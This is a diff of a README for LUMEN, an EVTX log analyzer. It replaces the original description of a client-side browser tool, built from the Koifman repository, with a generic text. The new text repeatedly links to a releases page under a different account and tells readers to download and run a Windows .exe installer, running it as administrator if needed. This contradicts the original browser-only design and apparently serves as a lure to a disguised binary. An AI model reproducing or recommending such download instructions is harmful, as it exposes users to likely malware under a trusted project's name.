@@ -1,61 +1,85 @@
-# LUMEN — Client‑Side EVTX Companion
+# 🌟 LUMEN - Your Easy EVTX File Viewer
 
-![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*baIkQcUohn7SJl9ULbBUcw.png)
+## 🚀 Getting Started
 
-LUMEN is a browser-based Windows Event Log analyzer that stays entirely on your machine. Load EVTX files, run curated SIGMA detections, correlate activity into storylines, extract IOCs, and export findings—without sending logs anywhere. If you are interested in contributing, feel free to check out the [guidelines](https://github.com/Koifman/LUMEN/blob/main/CONTRIBUTING.md).
+Welcome to LUMEN! This is your browser-based companion for viewing EVTX files easily and efficiently. Follow these simple steps to get started.
 
-## What it does
-- **Multi-file upload**: Upload multiple EVTX files simultaneously with merged analysis and file-based filtering for comprehensive investigations across entire log folders.
-- **Guided investigations**: A collapsible side-rail keeps you on track from ingest → detections → correlation → export.
-- **Curated SIGMA loads**: Pick platform (Windows/Linux/macOS/Cloud/Network) and filter rule categories before loading to reduce noise and speed up matching.
-- **Custom SIGMA rules**: Upload and manage your own SIGMA rules for organization-specific detections alongside curated rules.
-- **Detection & triage**: Severity-tagged matches with cached results across views; supports large-but-reasonable files with warnings above 25k events.
-- **Correlation & story view**: Chains related events, with a narrative "Storyline" tab for fast triage and a detailed chain view with process context.
-- **IOC extraction + VT integration**: Pull IPs/domains/hashes/paths/URLs/registry keys; optional VirusTotal lookups with API key input.
-- **Dashboards & timeline**: High-level dashboards, process analysis, and a SIGMA-aware timeline for sequence analysis.
-- **Process masquerading detection**: Levenshtein distance-based detection of process names similar to legitimate Windows processes with customizable threshold and exclusion lists.
-- **Suspicious location analysis**: Automatic flagging of processes executed from temporary, download, or public folders with grouping by process name and parent.
-- **Sessions & exports**: Save/restore sessions locally (no server), export reports, and use built-in sample data for demos.
-- **Privacy by design**: 100% client-side (WASM + JS); no telemetry, no uploads.
+## 🛠️ System Requirements
 
-## Quickstart
-```bash
-git clone --recurse-submodules https://github.com/Koifman/LUMEN.git
-cd LUMEN
-npm install
-npm run build # You have to do this since we get the rule numbers/categories from a manifest file generated at build
-npm run dev  # app at http://localhost:5173
-```
+- A modern web browser (Chrome, Firefox, Safari)
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4 GB
+- Internet connection for downloading the application
 
-If you already cloned without submodules:
-```bash
-git submodule update --init --recursive
-```
+## 📥 Download LUMEN
 
-## Workflow
-1) **Upload logs**: Drag/drop single or multiple EVTX files, or load samples. File size limit: 1GB per file. Supports both binary EVTX and XML exports. Multi-file uploads are automatically merged for cross-file analysis with color-coded visualization and file filtering.
-2) **Select analysis**: SIGMA Detection, Event Correlation, Dashboards, Timeline, IOC Extraction, Raw Logs, AI Analysis.
-3) **Load SIGMA**: Choose platform and (optionally) categories; rules load dynamically and cache for the session. Upload custom SIGMA rules for organization-specific detections.
-4) **Investigate**:
-   - Detections: severity-filtered results with rule details; filter by source file when analyzing multiple files.
-   - Correlation: Analyzes events with SIGMA matches (+ context events); chain list + Storyline summary for fast triage.
-   - IOC Extraction: categorized indicators, VT lookup buttons, export IOCs.
-   - Dashboards/Timeline/Process views: aggregated and time-sequenced perspectives with file breakdown statistics.
-   - Process Execution Analysis: Detects masquerading attempts using Levenshtein distance matching (customizable threshold 1-5) against 166+ legitimate Windows processes; flags processes from suspicious locations (temp folders, downloads, etc.); supports path/process exclusions with editable legitimate process list.
-   - AI Analysis: Optional AI-powered analysis using Anthropic Claude, OpenAI, Google Gemini, or Ollama.
-5) **Export or save**: Generate reports or save a session locally to resume later.
+[![Download LUMEN](https://img.shields.io/badge/Download%20LUMEN-Click%20Here-blue.svg)](https://github.com/LOL123344/LUMEN/releases)
 
-## Architecture (high level)
-- **React + Vite** frontend; heavy views lazy-loaded to trim initial bundle.
-- **SIGMA engine** (`src/lib/sigma/`): parser, compiler, matcher with platform/category-scoped loading from `src/sigma-master`; supports custom rule uploads.
-- **Correlation engine** (`src/lib/correlationEngine.ts`): links SIGMA-matched events into chains using process/temporal relationships.
-- **EVTX parsing**: WASM-backed parsing (using evtx Rust library) with chunked processing for large files; supports both binary EVTX and XML exports; multi-file upload with merged analysis.
-- **Multi-file support**: File source tracking, color-coded visualization, file filtering, and breakdown statistics for analyzing multiple log files simultaneously.
-- **Persistence**: `localStorage`-based session save/restore (metadata index + compressed payload); supports multi-file sessions.
+To get LUMEN, visit our releases page and download the latest version. 
 
-## Testing & samples
-- Built-in sample loader plus `samples/EVTX-ATTACK-SAMPLES` for quick demos.
+## 📂 Download & Install
 
+1. Click on the [Download LUMEN](https://github.com/LOL123344/LUMEN/releases) link. You will see a list of available versions.
+  
+2. Find the most recent version at the top of the page. Click on it to go to the release details.
 
-## License
-MIT — see [LICENSE](LICENSE).
+3. Scroll down to the “Assets” section.
+  
+4. Download the appropriate file for your operating system by clicking on the link. For example, if you are using Windows, look for the `.exe` file.
+
+5. Once the download is complete, locate the file in your downloads folder.
+
+6. Double-click the downloaded file to install LUMEN. Follow the prompts in the installation wizard.
+
+7. After installation, you can open LUMEN through your Applications folder or Start Menu.
+
+## ⚙️ How to Use
+
+1. Launch LUMEN from your Applications folder or Start Menu.
+   
+2. Open your EVTX file by clicking the "Open File" button.
+  
+3. Navigate to the folder where your EVTX file is located and select it.
+
+4. After selecting the file, you will see the events displayed in an organized manner.
+
+5. You can filter, search, and analyze the events as needed.
+
+## 👩‍💻 Features
+
+- **User-Friendly Interface:** Navigate easily with simple buttons and menus. 
+- **Search Functionality:** Quickly find specific events using search keywords.
+- **Event Filtering:** Narrow down visible events based on criteria like date and type.
+- **Export Options:** Save your filtered data in various formats for reports.
+  
+## 📝 FAQs
+
+**Q: What is an EVTX file?**  
+A: An EVTX file is a log file created by Windows Event Viewer. It contains data about system events, security logs, and application logs.
+
+**Q: Is LUMEN free?**  
+A: Yes, LUMEN is completely free to download and use.
+
+**Q: Can I use LUMEN offline?**  
+A: Yes, once installed, you can use LUMEN offline to view your EVTX files.
+
+## 🚧 Troubleshooting
+
+- If you have trouble opening a file, ensure you have downloaded the correct version for your operating system.
+- For installation issues, try running the installer as an administrator or check for security settings that may block the installation.
+
+## 🔗 Additional Resources
+
+For more information, visit the [GitHub Repository](https://github.com/LOL123344/LUMEN).
+
+## 💬 Support
+
+If you need help or have questions, you can reach out on the issues page of the GitHub repository. We aim to respond as soon as possible.
+
+## 📅 Changelog
+
+Stay updated with the latest changes in each version by checking the changelog on our releases page. This will help you understand new features and bug fixes.
+
+[![Download LUMEN](https://img.shields.io/badge/Download%20LUMEN-Click%20Here-blue.svg)](https://github.com/LOL123344/LUMEN/releases)
+
+Thank you for choosing LUMEN! Enjoy viewing your EVTX files!
